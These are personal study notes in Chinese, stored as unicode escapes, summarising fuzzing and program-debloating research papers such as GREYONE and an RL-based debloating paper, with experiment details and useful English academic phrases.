block\u7684\u2014\u2014\u5728\u6bcf\u4e2a\u57fa\u672c\u5757\u5f00\u5934\u53d8\u62100xCC\uff08encode the current frontier\uff09\uff0c\u89e6\u53d1\u4e86\u4e2d\u65ad\u8bf4\u660e\u6709\u65b0\u7684\u8986\u76d6\u7387\uff0c\u9700\u8981\u505c\u4e0bfork server\u53bb\u6389\u8fd9\u4e2a\u4e2d\u65ad\u518d\u7ee7\u7eed\u8dd1 \u505acoverage-guided tracing \u4eba\u5bb6\u7684\u5b9e\u9a8c\u5176\u5b9e\u4e0d\u662f\u5728\u505afuzzing\uff0c\u800c\u662f\u5148\u8dd1afl-qemu\u6536\u96c624\u5c0f\u65f6\u6240\u6709\u751f\u6210\u7684seed\uff085\u4e2a\u4e0d\u540c\u7684test case datasets\uff09\uff0c\u518d\u6539\u4e86afl\u53ea\u8dd1run_target\uff0c\u770b\u4e0d\u540c\u7684\u8bbe\u8ba1\u4e0b\u8017\u65f6\u7684\u533a\u522b \u53bb\u6389\u566a\u97f3\u7528\u7684trimmed-mean denoising \u53bb\u6389\u6700\u5927\u6700\u5c0f33% \u5b9e\u9a8c\u662f5\u4e2adataset,\u6bcf\u4e2a\u91cd\u590d8\u6b21 \u57fa\u4e8eafl-dyninst\u5b9e\u73b0\uff0c\u4f46\u662f\u8fd9\u73a9\u610f\u6027\u80fd\u4e0d\u884c \u6240\u4ee5\u8dd1\u7684oracle\u7a0b\u5e8ffork server\u8fd8\u662f\u7528afl-as\u63d2\u7684 \u5728tracer\u8bb0\u5f55\u5757\u7684\u8986\u76d6\u7387\u7684\u65f6\u5019\uff0c\u4e00\u4e2a\u5757\u53ef\u80fd\u6267\u884c\u591a\u6b21\u5f88\u5927\u7684overhead\uff0c\u4e8e\u662f\u641e\u4e86\u4e2a\u5168\u5c40\u7684hashmap\uff0c\u548cfork server\u5171\u4eab \u4e4b\u540e\u7684\u8fdb\u7a0b\u5c31\u77e5\u9053\u54ea\u4e9b\u624d\u662funique-covered basic blocks \u4e0d\u61c2\u7684\u5730\u65b9\uff1a\u4e3a\u5565\u4f1a\u5c1d\u8bd5\u5bf9\u540c\u4e00\u4e2a\u5730\u65b9\u591a\u6b21unmodify? We observe that even coverage-increasing test cases often have significant overlaps in coverage. This causes UnTracer to attempt unmodifying many already-unmodified basic blocks, resulting in high overhead. \u9009\u62e9\u7684fuzz\u6587\u4ef6\u7c7b\u578b\uff1adev\u5f00\u53d1\uff0c\u56fe\u7247\uff0c\u538b\u7f29data archiving\uff0c\u7f51\u7edcnetwork utilities\uff0c\u97f3\u9891\uff0c\u6587\u6863\uff0c\u5bc6\u7801\u5b66cryptography\uff0cweb\u5f00\u53d1 timeout\u4e5f\u662f\u4e00\u4e2a\u5f88\u91cd\u8981\u7684\u56e0\u7d20 \u5982\u679ctimeout\u7684\u6587\u4ef6\u592a\u591a \u4f5c\u8005\u7684\u4f18\u52bf\u5c31\u4e0d\u660e\u663e\u4e86\uff1b\u5b9e\u9a8c\u8bbe\u7f6e\u4e3a500ms\u7684\u8d85\u65f6 \u6bd4\u8f83\u7684baseline: \u53eafork server\u4e0d\u8fdb\u884c\u4efb\u4f55\u63d2\u6869\uff0c\u8fd9\u662f\u6700\u5feb\u7684 overhead\u662f\u76f8\u5bf9\u4e8e\u8fd9\u4e2abaseline\u800c\u8a00\u7684 \u540e\u7eed\u8981\u4e86\u89e3\u7684\uff1a Intel PT\u786c\u4ef6\u8f85\u52a9[11],[4],[12]\u7684\u8986\u76d6\u7387 overhead\u66f4\u5c0f\uff0c\u7f3a\u70b9\uff1a\u9700\u8981\u4e00\u4e2a\u652f\u6301\u7684CPU\uff0c\u89e3\u7801CFG\u65e5\u5fd7\u8017\u65f6\uff0c\u53ea\u652f\u6301x86 Xuwen\u7684\u4f18\u5316\u64cd\u4f5c\u7cfb\u7edf\u7684\u7cfb\u7edf\u8c03\u7528[61] fuzzer-agnostic operating primitives \u7a0b\u5e8f\u6539\u5199AFL-lafIntel [70] unrolls magic bytes into single comparisons at compile-time, but currently only supports white-box binaries. \u4e09\u79cd\u8986\u76d6\u7387\u7684\u8ba1\u7b97\u65b9\u5f0f\uff1a\u57fa\u672c\u5757\uff0c\u8fb9\uff0cbasic block path\u8fd9\u4e00\u79cd\u6ca1\u4eba\u505a \u53ea\u8bb0\u5f55basic block\u6765\u63a8\u65ad\u8fb9\u7684\u4fe1\u606f\uff0c\u662f\u6709\u95ee\u9898\u7684\uff1a\u5b58\u5728critical edges\u5c31\u4e0d\u51c6\u786e\uff0c\u9700\u8981\u5148\u53bb\u6389critical edges\u624d\u884c \u5c31\u662f\u7a7a\u7684else\u4e5f\u8981\u5f53\u6210\u4e00\u4e2a\u5757 \u5426\u5219\u4f1a\u9519\u8bef\u5730\u4e22\u6389\u4e00\u4e9b\u53d1\u73b0\u4e86\u65b0\u8986\u76d6\u7387\u7684\u79cd\u5b50 erroneously discard coverage-increasing inputs.\uff08\u53ef\u80fdafl\u5bf9for\u7684\u652f\u6301\u5c31\u662f\u8fd9\u4e2abug afl\u7684queue\u91cc\u7684\u6587\u4ef6\u6709+cov\u7684\u624d\u662f\u53d1\u73b0\u4e86\u65b0\u7684\u8986\u76d6\u7387\u7684 \u5f71\u54cdafl\u53d8\u5f02\u4f18\u5148\u7b56\u7565\u7684\u9664\u4e86coverage\u8fd8\u6709\u6587\u4ef6\u5927\u5c0f\uff0c\u76f8\u540c\u8986\u76d6\u7387\u4f18\u5148\u7528\u5c0f\u7684seed p-value\u5c0f\u4e8e0.05\u8981\u8bf4(pair-wise) hybrid\u7684fuzzer\u82b1\u66f4\u591a\u7684\u65f6\u95f4\u53d8\u5f02 \u5982QSYM Effective Program Debloating via Reinforcement Learning \u00b6 CCS18 PDF \u6982\u62ec\uff1a\u628a\u673a\u5668\u5b66\u4e60\u7528\u5230Program Debloating\uff0c\u57fa\u672c\u65b9\u6cd5\u662f\u53cd\u590d\u5207\u7247\u53bb\u6389\uff0c\u7528Reinforcement Learning\u6765\u51cf\u5c11\u7f16\u8bd1\u6d4b\u8bd5\u7684\u6b21\u6570 \u5355\u8bcd seldom if ever used by average users \u4e00\u822c\u7528\u6237\u4e0d\u4f1a\u7528 has led to its sparing use \u5bfc\u81f4\u6ca1\u4eba\u7528 has been shown to suffice in the literature on \u2026 \u8bba\u6587\u4e2d\u5df2\u7ecf\u63d0\u5230 mangle \u641e\u4e71\u7a0b\u5e8f sacrifice efficiency \u8bf4\u522b\u4eba\u7684\u4e0d\u8db3\u7684\u65f6\u5019\u8bf4\u727a\u7272\u4e86xxx tailored to C/C++ \u53ea\u9002\u5408xxx myopic \u77ed\u89c6\u7684 Since the rules are myopic, C-Reduce generates a significant number of syntactically invalid candidates albeit \u4f46\u662f albeit due to a different reason. presuming a general setting where such an analysis may not be available \u4e3e\u7684\u4f8b\u5b50\u53ef\u4ee5\u5f88\u7b80\u5355\u9759\u6001\u5206\u6790\u51fa\u6765\uff0c\u8bf4\u4e00\u822c\u7684\u60c5\u51b5\u4e0b\u9759\u6001\u5206\u6790\u6ca1\u7528 akin to \u2026 \u548cxxx\u76f8\u540c \u63d2\u5165\u8bed because it not only avoids syntactic errors, akin to Perses, but it also learns to avoid semantic errors. Overall \u4e00\u6bb5\u8bdd\u7ed3\u675f\u7684\u65f6\u5019\u603b\u7ed3 large boilerplate code \u4e00\u5927\u6bb5\u4ee3\u7801 heed to \u9075\u5b88 C-Reduce does not heed to common software engineering practices such as modularity and locality suffices in practice\u5b9e\u9645\u4e0a\u662f\u5426\u8db3\u591f The reader may wonder whether a naive approach to program reduction based on runtime code coverage suffices in practice. empirically comfirmed \u9a8c\u8bc1\u9c81\u68d2\u6027\u53ea\u80fd\u7ecf\u9a8c\u6027\u5730\u9a8c\u8bc1 in this regard \u5728\u8fd9\u4e2a\u65b9\u9762 We can mitigate the issue by combining the results of multiple static analyzers that possess different capabilities in this regard. idea \u7a0b\u5e8f\u7684\u5e93\u548c one - size - fits - all\u7684\u5f00\u53d1\u65b9\u5f0f\u5bfc\u81f4\u4e86\u5927\u91cf\u5f88\u5c11\u7528 / \u6ca1\u7528\u7684\u4ee3\u7801 \u524d\u4eba\u7684\u505a\u6cd5\u6ca1\u8003\u8651\u8bed\u4e49\u4f9d\u8d56 \u5bfc\u81f4\u672a\u521d\u59cb\u5316\u53d8\u91cf\u7b49\u8bed\u4e49\u9519\u8bef unaware of semantic dependencies between program elements ( e . g . , def - use relations of variables debloating \u901a\u8fc7 delta debugging \u4e00\u6b65\u6b65\u53bb\u6389\u7a0b\u5e8f\u4e2d\u80fd\u5220\u7684\u7247\u6bb5\uff0c\u7528\u5f3a\u5316\u5b66\u4e60\u52a0\u901f\uff08\u51b3\u7b56\u6811 \u9a6c\u5c14\u79d1\u592b\u51b3\u7b56\u8fc7\u7a0b\uff09\uff0c\u4fdd\u8bc1\u80fd\u8fc7\u6d4b\u8bd5 high - level specification \uff0c\u6700\u540e\u5f97\u5230\u7684\u4e8c\u8fdb\u5236\u4efb\u4f55\u4e00\u4e2a\u7247\u6bb5\u90fd\u4e0d\u80fd\u518d\u5220\uff08 1 - minimality \uff09 \u8fd9\u4e2a\u65b9\u6cd5\u80fd\u6269\u5c55\u5230\u5927\u7a0b\u5e8f\uff0c\u907f\u514d\u73b0\u6709\u5de5\u5177\u8d85\u65f6\u7684\u95ee\u9898 \u8fd9\u4e2a\u65b9\u6cd5\u8fd8\u53ef\u4ee5\u964d\u4f4e\u653b\u51fb\u9762 \u53bb\u6389\u53ef\u9009\u529f\u80fd\u4e2d\u7684\u6f0f\u6d1e\uff0c\u51cf\u5c11 ROP gadget \u60f3\u505a\u5230\u4e94\u70b9\uff1a \u6700\u5c0f\uff1b\u8017\u65f6\u77ed\uff1b\u9c81\u68d2\u4e0d\u5f15\u5165\u65b0\u7684\u6f0f\u6d1e\uff1b\u751f\u6210\u7684\u4ee3\u7801\u53ef\u7ef4\u62a4\u53ef\u6269\u5c55\uff1b\u901a\u7528 \u6bd4\u9759\u6001\u5206\u6790\u52a8\u6001coverage\u7684\u90fd\u5c0f\uff1b\u5176\u4ed6\u4eba\u8d85\u65f6\u6211\u4eec\u90fd\u884c\uff1b\u7528\u9759\u6001\u5206\u6790\u5de5\u5177\u548cAFL\u6d4b3\u5929\u53ef\u4ee5\u53cd\u9988loop\uff1b\u4fdd\u7559\u4e86modularity and locality\uff1b\u65b9\u6cd5\u901a\u7528 \u548c\u7f16\u7a0b\u8bed\u8a00\u3001\u89c4\u8303\u65e0\u5173 \u89c4\u8303\u5c31\u662f\u6d4b\u8bd5\u4ee3\u7801 \u8f93\u5165\u4e00\u4e2a\u88c1\u526a\u540e\u7684\u4ee3\u7801 \u8f93\u51fa\u80fd\u5426\u6ee1\u8db3\uff1a \u80fd\u8fc7\u7f16\u8bd1\uff1b\u9700\u8981\u7684\u529f\u80fd\u6b63\u5e38\uff1b\u4e0d\u9700\u8981\u7684\u529f\u80fd\u81f3\u5c11\u4e0d\u80fd\u5d29\uff08\u6d4b\u8bd5\u6837\u4f8b\u6765\u81ea\u56de\u5f52\u6d4b\u8bd5\uff09\uff1b\u8981\u4f7f\u7528sanitizer\u786e\u4fdd\u6ca1\u6709\u672a\u5b9a\u4e49\u884c\u4e3a \u9a6c\u5c14\u79d1\u592b\u51b3\u7b56\u8fc7\u7a0b MDP \u57fa\u4e8e\u6a21\u578b\u7684\u5f3a\u5316\u5b66\u4e60 MBRL \u5728\u6a21\u578b\u7684\u5e2e\u52a9\u4e0b\u89e3\u51b3MDP\u95ee\u9898\uff0c\u5b66\u51fa\u8f6c\u6362\u7684\u6982\u7387\u548c\u5956\u8d4f\uff0c\u5f97\u5230\u53ef\u4ee5\u6700\u5927\u5316\u6536\u76ca\u548c\u7684\u52a8\u4f5c \u65b9\u6cd5\uff1a\u6267\u884c\u8fc7\u7a0b\u4f1a\u66f4\u65b0\u51b3\u7b56\u6811 \u7a0b\u5e8f\u7684\u7f16\u7801\u5c31\u662f\u7a0b\u5e8fn\u4efd \u6bcf\u4e00\u4efd\u662f\u5426\u5b58\u5728 \u4e00\u5f00\u59cb\u5c31\u662fn\u4e2a1 \u5177\u4f53\u5b9e\u73b0\u7684\u65f6\u5019\u662f\u5148\u5220global-level\u7684\u7ec4\u4ef6 \u5982\u5168\u5c40\u53d8\u91cf\u58f0\u660e\u3001\u7c7b\u522b\u5b9a\u4e49\u3001\u51fd\u6570\u5b9a\u4e49\uff0c\u518d\u5220\u5c40\u90e8\u7c7b\u522b\u7684\u7ec4\u4ef6 \u8d4b\u503c\u3001if\u8bed\u53e5\u3001while\u8bed\u53e5\uff0c\u7136\u540e\u7ee7\u7eedglobal local \u2026\u8fed\u4ee3\u5230\u7a33\u5b9a \u4f7f\u7528\u7b80\u5355\u7684\u4f9d\u8d56\u5206\u6790\u6765\u62d2\u7edd\u4e0d\u53ef\u80fd\u7684\u7a0b\u5e8f \u5982\u6ca1\u6709main \u7f3a\u5931\u53d8\u91cf\u5b9a\u4e49 \u53d8\u91cf\u6ca1\u521d\u59cb\u5316 \u6ca1\u6709return\u8bed\u53e5 \u51b3\u7b56\u6811\u7528\u7684FastDT\uff0c\u7528\u7684exact decision trees\u6ca1\u6709boosting bagging \u8ba1\u7b97\u4ee3\u7801\u884c\u6570\u4e4b\u524d\u8981\u5148\u5b8f\u5c55\u5f00 Evaluation \u9009\u4e8610\u4e2abinutils\u91cc\u7684\u7a0b\u5e8f\uff0c\u90fd\u5728busybox\u91cc \u53ef\u4ee5\u76f4\u63a5\u6bd4\u8f83 \u907f\u514d\u4ea7\u751f\u6b7b\u5faa\u73af\u7684\u7a0b\u5e8f \u8bbe\u7f6e\u4e86\u4e0d\u540c\u7684timeout 0.01~1s \u753b\u56fe\u5dee\u5f02\u592a\u5927\u53ef\u4ee5\u622a\u65ad \u9876\u90e8\u663e\u793a\u6570\u503c \u6709\u4e9bCVE\u6ca1\u80fd\u5220\u6389 \u8bf4\u8fd9\u4e9b\u5728\u6838\u5fc3\u529f\u80fd\u91cc\u9762 \u4e0d\u80fd\u7b80\u5355\u5220\u6389 \u5982\u6761\u4ef6\u7ade\u4e89 \u4ea7\u751f\u7684\u4ee3\u7801\u4f7f\u9759\u6001\u5206\u6790\u5de5\u5177\u7684\u62a5\u544a\u51cf\u5c11\u4e8695.4% \u62a5\u544a\u5c31\u80fd\u770b\u4e86 The decreased size and complexity of the reduced programs also enable to apply more precise program checkers such as static analyzers. \u7136\u540e\u4eba\u5de5\u68c0\u67e5\u8bf4\u90fd\u662f\u8bef\u62a5 feedback process \u8dd1AFL\u7684\u65f6\u5019\u5d29\u4e86 \u53d1\u73b0\u662f\u7f55\u89c1\u7684\u60c5\u51b5 \u628a\u8fd9\u79cd\u6d4b\u8bd5\u7528\u4f8b\u8003\u8651\u8fdb\u53bb\u540e\u91cd\u65b0\u751f\u6210 \u518dfuzzing\u5c313\u5929\u90fd\u4e0d\u5d29\u4e86This simple feedback process effectively improved the robustness of the resulting program THREATS TO VALIDITY \u6d4b\u8bd5\u811a\u672c\u884c\u4e3a\u7684\u4e0d\u786e\u5b9a\u6027\uff1a\u7528sanitizer\u7f13\u89e3\uff0c\u4f9d\u8d56\u7684\u5176\u4ed6\u5e93\u4ee3\u7801\u9700\u8981\u4e5f\u7528\u540c\u6837\u7684\u7f16\u8bd1\uff1btimeout\u673a\u5236\u5f15\u5165\u7684\u8bef\u62a5\uff0c\u53ef\u4ee5\u6539\u53d8\u68c0\u6d4b\u6b7b\u5faa\u73af\u7684\u673a\u5236[20] \u4e0d\u4f9d\u8d56timeout \u6d4b\u8bd5\u6837\u4f8b\u4e0d\u5b8c\u6574may not be exhaustive enough \u4f7f\u7528\u57fa\u4e8e\u8bed\u6cd5\u7684fuzzer \u9759\u6001\u5206\u6790\u5de5\u5177\u7684unsoundness \u4e0d\u652f\u6301\u590d\u6742\u7684\u7279\u6027 \u5982\u590d\u6742\u7684\u6307\u9488\u7b97\u672f\u8ba1\u7b97\uff0c\u672a\u77e5\u8bed\u4e49\u7684API\u8c03\u7528\u5bfc\u81f4\u7684\u590d\u6742\u63a7\u5236\u6d41\u2014\u2014\u7ed3\u5408\u591a\u79cd\u9759\u6001\u5206\u6790\u5de5\u5177 \u66f4\u591a\u65b9\u5411 program reasoning \u60f3\u77e5\u9053\u662f\u5426\u5f15\u5165\u4e86\u65b0\u7684bug\uff0c\u5305\u62ec\u9759\u6001\u5206\u6790 \u52a8\u6001\u5206\u6790 fuzzing \u8fd0\u884c\u65f6\u76d1\u63a7 \u9a8c\u8bc1 \u9759\u6001\u5206\u6790\u5de5\u5177\uff1aSparrow [13]\u2014a static analyzer for finding security bugs \u53ef\u4ee5\u68c0\u6d4bbug\uff0c\u8fd8\u80fd\u79fb\u9664\u4e0d\u53ef\u8fbe\u4ee3\u7801 \u7a0b\u5e8fdebloating \u7c97\u7c92\u5ea6\u7684Docker\u5927\u5bb9\u5668\u62c6\u89e3\u6210\u591a\u4e2a\u5c0f\u5bb9\u5668 \u9700\u8981\u52a8\u6001\u5206\u6790\u5e94\u7528\u884c\u4e3a[35] \u66f4\u7ec6\u7c92\u5ea6\u7684\u6709\u505aJava [28]\u548cAndroid [27]\u5e94\u7528\u7684 \uff1b\u6709\u907f\u514d\u8f7d\u5165\u4e0d\u4f1a\u7528\u5230\u7684\u51fd\u6570\u7684[34] \uff08\u51fd\u6570\u7ea7\u522b\u7684\u4f9d\u8d56\u5206\u6790\uff09 \u53e6\u4e00\u4e2a\u6b63\u4ea4\u7684\u65b9\u5411\uff1a\u68c0\u6d4b\u548c\u51cf\u5c11\u8fd0\u884c\u65f6\u5185\u5b58\u81a8\u80c0 [9,33,40-43] \u8f93\u5165\u6837\u4f8b\u7684\u6700\u5c0f\u5316 \u573a\u666f\u662f\u6d4b\u8bd5\u7f16\u8bd1\u5668/\u89e3\u91ca\u5668\uff0c\u4ea7\u751f\u80fdcrash\u7684\u66f4\u5c0f\u7684\u7a0b\u5e8f \u4e0d\u8003\u8651\u5b89\u5168\u6027\u53ef\u8bfb\u6027 \u6709\u5de5\u4f5c\u8003\u8651\u4e86\u8bed\u6cd5\u7684\u6b63\u786e\u6027[23,32,37] \u4f46\u6ca1\u8003\u8651\u8bed\u4e49\u6b63\u786e\u6027 Program slicing \u6307\u5b9a\u4e00\u4e2a\u4f4d\u7f6e\u63d0\u53d6\u7a0b\u5e8f\u7684\u4e00\u5c0f\u90e8\u5206 \u9700\u8981\u6307\u5b9a\u8bed\u4e49\u548c\u4f9d\u8d56\u5173\u7cfb\uff08challenging\uff09\uff0c\u4e5f\u53ef\u80fd\u4e0d\u80fd\u53bb\u6389\u6f0f\u6d1e \uff08\u8fd9\u7bc7\u6587\u7ae0\u7684\u65b9\u6cd5\u66f4\u597d\uff09 \u9759\u6001\u53ef\u8fbe\u6027\u5206\u6790 \u4e0d\u80fd\u5904\u7406\u590d\u6742\u7684\u63a7\u5236\u6d41\u5982\u95f4\u63a5\u8c03\u7528\u3001\u590d\u6742\u6761\u4ef6\u548c\u6307\u9488\u7b97\u672f \u52a8\u6001\u53ef\u8fbe\u6027\u5206\u6790 \u8fd9\u7bc7\u6587\u7ae0\u7684\u65b9\u6cd5\u66f4\u597d future work: more expressive probabilistic models with efficient incremental learning, designing various forms of specification other than input-output examples, applying to debloat programs written in arbitrary languages such as binary. GREYONE: Data Flow Sensitive Fuzzing \u00b6 USENIX20 PDF \u5355\u8bcd: is labor-intensive and requires lots of manual efforts \u9700\u8981\u4eba\u5de5 Head-to-Head Comparison \u6bd4\u8f83\u4e0d\u540c\u7684work to draw conclusions as objective as possible \u5c3d\u53ef\u80fd\u5ba2\u89c2 \u9009\u88ab\u6d4b\u7a0b\u5e8f\u7684\u539f\u56e0 We chose target applications considering several factors, including popularity, frequency of being tested, development activeness, and functionality diversity. \u9009\u51fa\u6765\u7684\u7c7b\u522b\u5305\u542b graphics processing libraries (e.g., libcaca and libsixel), shipping with \u7528afl-cmin\u7684\u65f6\u5019\u8bf4the tool afl-cmin shipping with AFL \u786e\u5b9afuzzing\u7684\u65f6\u95f4 we test target applications for more time, until the fuzzers reach a relatively stable state (i.e., the order of fuzzers\u2019 performance does not change anymore). Experiments showed that the fuzzers will get stable after testing these applications for 60 hours. So, we tested each application for 60 hours in our experiment. \u9664\u4e86\u7ed9\u5e73\u5747\u7ed3\u679c \u4e5f\u7ed9\u51famaxinum number a steady and stronger growth trend \u5927\u90e8\u5206\u65b9\u9762\u90fd\u66f4\u5feb in a faster pace than QSYM in most subjects idea: \u4f7f\u7528\u8f7b\u91cf\u7ea7fuzzing-driven taint inference FTI \u6709\u4e86taint\u4e4b\u540e\u7528\u8f93\u5165\u4f18\u5148\u6a21\u578b\u5224\u65ad\u5148\u63a2\u7d22\u54ea\u4e2a\u8def\u5f84 \u53d8\u5f02\u54ea\u4e9b\u5b57\u8282 \u600e\u4e48\u53d8\u5f02 \u5f3a\u8c03dataflow features\uff1a constraint conformance \u53d8\u91cf\u7684\u503c\u4e0e\u9884\u671f\u503c\u7684\u8ddd\u79bb \u5b9e\u9a8c\u5728\u6700\u65b0\u7684\u8f6f\u4ef6\u4e0a\u8dd1 \u53d1\u73b0\u4e86105\u4e2a\u65b0\u7684bugs\uff0c\u62ff\u5230\u4e8641\u4e2aCVE RQ1: \u600e\u4e48\u505a\u8f7b\u91cf\u51c6\u786e\u7684\u6c61\u70b9\u5206\u6790 FTI\u53d8\u5f02\u8f93\u5165\u6bcf\u4e2a\u5b57\u8282\u770b\u53d8\u91cf\u503c\u7684\u53d8\u5316 \u8f7b\u91cf \u6ca1\u6709over-taint \u7f13\u89e3under-taint(\u53d8\u5f02\u4e0d\u5b8c\u6574\u4f1a\u6709) \u8fd0\u884c\u65f6\u975e\u5e38\u5feb RQ2: \u6709\u4e86taint\u600e\u4e48\u6709\u6548\u6307\u5bfc\u53d8\u5f02 \u9009\u62e9\u5565\u8def\u5f84 \u9009\u62e9\u54ea\u4e9b\u5b57\u8282 \u4f18\u5148\u9009\u62e9\u80fd\u5f71\u54cd\u66f4\u591a\u672a\u5230\u8fbe\u5206\u652f\u7684\u5b57\u8282\uff0c\u4f18\u5148\u4f9d\u8d56\u66f4\u591a\u4f18\u5148\u5b57\u8282\u7684\u5206\u652f RQ3: \u5982\u4f55\u4f7f\u7528\u6570\u636e\u6d41\u7279\u5f81(\u6c61\u70b9\u5c5e\u6027\u548c\u7ea6\u675f\u7b26\u5408\u6027)\u4f18\u5316\u8fdb\u5316\u65b9\u5411conformance-guided evolution \u4f18\u5148\u66f4\u9ad8\u7b26\u5408\u6027\u7684seeds \u80fd\u907f\u514dAngora\u7684\u9677\u5165\u5c40\u90e8\u6700\u4f18\u7684\u95ee\u9898\uff0c\u53e6\u5916\u5c06\u6b63\u5728\u6267\u884c\u7684\u53d8\u5f02rebase\u5230\u66f4\u597d\u7684seeds\u53ef\u4ee5\u663e\u8457\u4f18\u5316\u901f\u5ea6 \u7b26\u53f7\u6267\u884c\u4e0d\u80fd\u5904\u7406\u5927\u7a0b\u5e8f\uff0c\u4e0d\u80fd\u89e3\u51b3\u590d\u6742\u7684\u7ea6\u675f\u5982on-way functions \u4f20\u7edf\u7684\u52a8\u6001\u6c61\u70b9\u5206\u6790 \u9700\u8981\u5927\u91cf\u52b3\u52a8\u4eba\u7c7b\u5de5\u4f5c, \u4e0d\u51c6\u786e undertaint\u7684\u95ee\u9898 \u4e0d\u80fd\u5904\u7406\u9690\u5f0f\u6570\u636e\u6d41\uff0c\u975e\u5e38\u6162 \u4e0d\u7b26\u5408non-intererence rule[16]\u7684\u5c31\u6709\u4f9d\u8d56\u5173\u7cfb FTI\u53d8\u5f02\u7684\u65f6\u5019\u662f\u4f7f\u7528\u9884\u5148\u5b9a\u4e49\u7684\u53d8\u5f02\u89c4\u5219 \u5982\u5355\u4f4d\u7ffb\u8f6c\u3001\u591a\u4f4d\u7ffb\u8f6c\u548c\u7b97\u672f\u64cd\u4f5c\uff0c\u4e0d\u80fd\u4fdd\u8bc1\u5b8c\u5168\u53d8\u5f02 \u53d8\u91cf\u503c\u8ffd\u8e2a\u662f\u63d2\u4ee3\u7801 special value tracking code \u53ea\u5173\u6ce8\u4e0e\u8def\u5f84\u7ea6\u675f\u6709\u5173\u7684\u53d8\u91cf\uff0c\u540c\u65f6\u4e5f\u80fd\u63d0\u51fa\u503c\u548c\u5bf9\u5e94\u7684\u8f93\u5165\u5b57\u8282\u6bd4\u8f83 \u4e00\u81f4\u5c31\u662fdirect copy \u8f93\u5165\u5b57\u8282\u7684\u6743\u91cd\u662f\u5b83\u5f71\u54cd\u7684\u672a\u5230\u8fbe\u7684\u5206\u652f\u6570\u91cf\uff0c\u4e00\u4e2a\u672a\u5230\u8fbe\u5206\u652f\u7684\u6743\u91cd\u662f\u5b83\u4f9d\u8d56\u7684\u6240\u6709\u5b57\u8282\u6743\u91cd\u7684\u548c \u53d8\u5f02\u54ea\u4e2a\u4f4d\u7f6e\uff1f\u627e\u5f53\u524dseed\u672a\u8986\u76d6\u7684\u9644\u8fd1\u7684\u5206\u652f \u6309\u5206\u652f\u6743\u91cd\u5012\u5e8f\uff1b\u5bf9\u4e8e\u4e00\u4e2a\u5206\u652f\u4f9d\u8d56\u7684\u591a\u4e2a\u5b57\u8282\uff0c\u6309\u5b57\u8282\u7684\u6743\u91cd\u5012\u5e8f \u600e\u4e48\u53d8\u5f02\uff1fdirect copy\u5982\u679c\u9700\u8981\u8ddf\u4e00\u4e2a\u8fd0\u884c\u65f6\u7b97\u51fa\u7684checksum\u76f8\u7b49 \u5148\u5f97\u5230\u8fd0\u884c\u65f6\u9700\u8981\u7684\u503c\uff0c\u518d\u4f7f\u7528\u8fd9\u4e2a\u503c\u548c\u5fae\u5c0f\u53d8\u5f02\u6765\u4fee\u590d\u5bf9\u5e94\u7684\u8f93\u5165\u5b57\u8282 \u53ef\u4ee5\u76f4\u63a5\u77e5\u9053\u5e94\u8be5\u4fee\u6539\u54ea\u4e2aoffset \u9700\u8981\u4ec0\u4e48\u503c indirect copies\u5c31\u968f\u673a\u53d8\u5f02 \u53ef\u4ee5\u4e00\u6b21\u53d8\u5f02\u591a\u4e2a\u5b57\u8282 \u7f13\u89e3undertaint \u9664\u4e86\u4f9d\u8d56\u7684\u5b57\u8282 \u4e5f\u4ee5\u4e00\u4e2a\u8f83\u4f4e\u7684\u6982\u7387\u53d8\u5f02\u90bb\u5c45\u5b57\u8282 \u8ba1\u7b97\u7b26\u5408\u6027 \u5bf9\u4e8e\u672a\u5230\u8fbe\u7684\u5206\u652f \u5b9a\u4e49\u662f\u4e24\u4e2a\u6bd4\u8f83\u7684\u503c\u4e4b\u95f4\u6709\u591a\u5c11bit\u4e00\u81f4\uff0c \u5bf9\u4e8e\u4e00\u4e2a\u5df2\u7ecf\u5230\u8fbe\u57fa\u672c\u5757 \u5b9a\u4e49\u662f\u5176\u6240\u6709\u672a\u5230\u8fbe\u90bb\u5c45\u7684\u7b26\u5408\u6027\u7684\u6700\u5927\u503c\uff0c \u5bf9\u4e8e\u4e00\u4e2aseed \u5b9a\u4e49\u662f\u8986\u76d6\u7684\u6240\u6709\u57fa\u672c\u5757\u7684\u7b26\u5408\u6027\u7684\u7d2f\u52a0 seed queue\u65b0\u7684\u7ed3\u6784 \u5728\u76f8\u540ccoverage \u53d1\u73b0\u66f4\u9ad8\u5206\u6570\u7684seed\u7684\u65f6\u5019 \u66ff\u6362\uff1b\u5728\u53d1\u73b0\u76f8\u540ccoverage \u76f8\u540c\u5206\u6570 \u4f46\u57fa\u672c\u5757conformance\u7684\u5206\u5e03\u4e0d\u540c\u7684\u65f6\u5019\uff0c\u52a0\u5165\u7684\u8fd9\u4e2aNode\u6570\u7ec4 \u8fd9\u79cd\u65b9\u5f0f\u53ef\u4ee5\u4e0e\u68af\u5ea6\u4e0b\u964d\u76f8\u5f53\uff0c\u8fd8\u80fd\u907f\u514dAngora\u7684\u9677\u5165\u5c40\u90e8\u6700\u4f18\u7684\u95ee\u9898 \u5728\u66ff\u6362seed\u540e \u540e\u7eed\u5bf9\u8fd9\u4e2aseed\u7684\u4f7f\u7528\u4e5f\u7acb\u523b\u6362\u6210\u65b0\u7684seed \u8fd9\u6837\u53ef\u4ee5\u5728LAVA\u6570\u636e\u96c6\u4e0a\u5feb3\u500d \u9009seed\u7684\u65f6\u5019 \u7ed9\u9ad8\u5206\u6570\u7684\u66f4\u9ad8\u6743\u91cd selective testing \u76f8\u6bd4AFL\u7684coverage tracking\u591a\u4e86\u4e24\u4e2a\u6a21\u5f0f\uff1aFTI\u53d8\u91cf\u503c\u76d1\u6d4b\uff0c\u8fdb\u5316\u4f18\u5316\u7b97conformance\u5206\u6570 \u5f53conformance\u4e00\u6bb5\u65f6\u95f4\u4e0d\u589e\u52a0\u4e86\u5c31\u5207\u56deAFL\u7684\u6a21\u5f0f \u63d0\u9ad8\u8fd0\u884c\u901f\u5ea6 conformance\u8ba1\u7b97\u7528\u7684by operations like __builtin_popcount FTI\u7528\u5230\u7684\u503c\u76d1\u6d4b \u7528\u7684bitmap\u7684\u7ed3\u679c \u7ed9\u6bcf\u4e2a\u53d8\u91cf\u4e00\u4e2a\u5168\u5c40\u552f\u4e00\u7684ID LAVA-M\u9664\u4e86who\u4e5f\u6709unlisted bugs? \u66f4\u6df1\u5165\u7684\u5206\u6790\uff1a FTI\u7684under taint\u95ee\u9898 FTI\u6709\u6ca1\u6709\u7528\uff1f \u5b9e\u73b0\u4e00\u4e2a\u57fa\u4e8eDTA\u7684\u955c\u50cf\u6bd4\u8f83 \u5404\u4e2a\u4e0d\u540c\u90e8\u5206\u5bf9\u7ed3\u679c\u7684\u8d21\u732e 